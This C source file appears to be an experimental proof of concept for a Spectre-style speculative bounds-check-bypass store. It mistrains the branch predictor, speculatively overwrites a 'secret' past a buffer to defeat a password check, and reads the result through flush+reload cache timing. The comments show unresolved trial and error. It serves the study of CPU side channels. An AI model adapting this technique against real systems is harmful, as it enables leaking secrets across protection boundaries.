#include <stdio.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 1
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define BUF_SIZE 16

int  n_training   = 10;
int  secret_size  = 1;


/*
 * Variables required in Cache
 *  user_idx
 *  buf
 *  user_char_copy
 *  user_passwd
 *  secret
 *  super_secret
 *
 * Variables requried in mem:
 *  buf_size
 */

typedef struct cache_vars {
    char user_idx;
    char user_char;
    char user_passwd;
    char super_secret;

    char secret;                                                    //OPTION 1: works for some reason?
    char buf[BUF_SIZE];
    //char secret;                                                  //OPTION 2: should work but does not

} cache_vars_t;

int overwrite_index = 4094 - 512 + 1;//BUF_SIZE;//4094 - 512;       //OPTION 1: works for some reason?
//int overwrite_index = BUF_SIZE;                                   //OPTION 2: should work but does not

int  buf_size __attribute__ ((aligned (256))) = BUF_SIZE;
cache_vars_t cache __attribute__ ((aligned (256)));

void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* arr, char super_secret) {



    //gooi dit maar in struct

    cache.user_idx = user_idx;
    cache.user_char = user_char;
    cache.user_passwd = user_passwd;
    cache.secret = 'x';
    cache.super_secret = super_secret;//97;
    buf_size = BUF_SIZE;
    //printf("uid = %4d\tuc = %c\tpwd=%c\n", user_idx, user_char_copy, user_passwd);
    //printf("secret p = %p\tbuf = %p\tbuf[last] = %p\toverwr = %p\n",
    //       &cache.secret, &cache.buf, &cache.buf[buf_size-1], &cache.buf[cache.user_idx]);

    /*cache.user_idx = user_idx;
    cache.user_char = user_char;
    cache.user_passwd = user_passwd;
    cache.secret = 'x';
    cache.super_secret = 97;

    buf_size = BUF_SIZE;*/

    cpuid();
    flush((void*)&buf_size);
    cpuid();

    //bounds check should prevent overwrite. But speculatively executes
    if (cache.user_idx < buf_size) {
        //if (user_char_copy == 's') printf("\noverwriting %p with 's'\n", &buf[user_idx]);
        cache.buf[cache.user_idx] = cache.user_char;
    }

    //printf("secret = %c\n", secret);
    //volatile cp_t cp1 = arr[0];
    //volatile cp_t cp = arr[cache.secret];
    //volatile cp_t cp2 = arr[cache.user_passwd];
    //secret has been (speculatively) overwritten with user char.
    if (cache.user_passwd == cache.secret) {
        //volatile cp_t cp = arr[cache.super_secret];
        volatile cp_t cp = arr[cache.secret];
        //printf("super secret: '%c' (%d)\n", cp.id, cp.id);
    }

}

int* overwrite(int index) {

    cp_t* arr = mmap_arr_cache_pages(N_PAGES);
    flush_arr((void*)arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = n_training + 1;
    int user_ids[n_accesses];
    char user_chars[n_accesses];
    char user_pwds[n_accesses];
    char user_s_secret[n_accesses];

    for(int i = 0; i < n_accesses; i++) {
        user_ids[i] = i % BUF_SIZE;
        user_chars[i] = 'a' + (i%26);
        user_pwds[i] = 'x';
        user_s_secret[i] = 'b';
    }
    user_ids[n_training] = overwrite_index;//4094 - 512;// + 10000;
    user_chars[n_training] = 's';
    user_pwds[n_training] = 's';
    user_s_secret[n_training] = 'c';
    cpuid();

    //Misstrain branch predictor, access out of bounds on last call
    for(int i = 0; i < n_accesses; i++) {
        check_passwd(user_ids[i], user_chars[i], user_pwds[i], arr, user_s_secret[i]);
        //ensures completion before flushing. bar prevents speculative access from being flushed
        cpuid();
        if(user_pwds[i] != 's') {
            asm volatile ("cpuid\n":::);
            flush((void*)&arr[user_s_secret[i]]);
            flush((void*)&arr[user_pwds[i]]);
        }
        cpuid();
    }

    //make sure previous loop finishes execution
    cpuid();

    //time loading duration per array index
    int* results = reload(arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(arr, N_PAGES);
    return results;
}


int main(int argc, char** argv) {
    printf("secret p = %p\tbuf = %p\tbuf[last] = %p\toverwr = %p\n",
           &cache.secret, &cache.buf, &cache.buf[BUF_SIZE-1], &cache.buf[overwrite_index]);

    int*** results = alloc_results(REPETITIONS, secret_size, N_PAGES); //results[REPETITIONS][secret_size][N_PAGES]ints
    results[0][0] = overwrite(0);
    /*for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < secret_size; s++) {
            results[r][s] = overwrite(s);
            __sync_synchronize();
        }
    }*/
    print_results(results, REPETITIONS, secret_size, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, secret_size);
    //check_passwd(11, 's', 's');

    //reload();

    //print_results

    for(int i = 0; i < BUF_SIZE; i++) {
        cache.buf[i] = i;
    }
    cache.secret = 0xf1;
    cache.super_secret = 0xf2;
    cache.user_idx = 0xaa;
    cache.user_passwd = 0xbb;
    cache.user_char = 0xcc;

    unsigned char* cache_arr = (char*)&cache;
    cache_print(cache_arr, sizeof(cache_vars_t));

    cache.buf[overwrite_index] = 0xdd;

    cache_print(cache_arr, sizeof(cache_vars_t));

}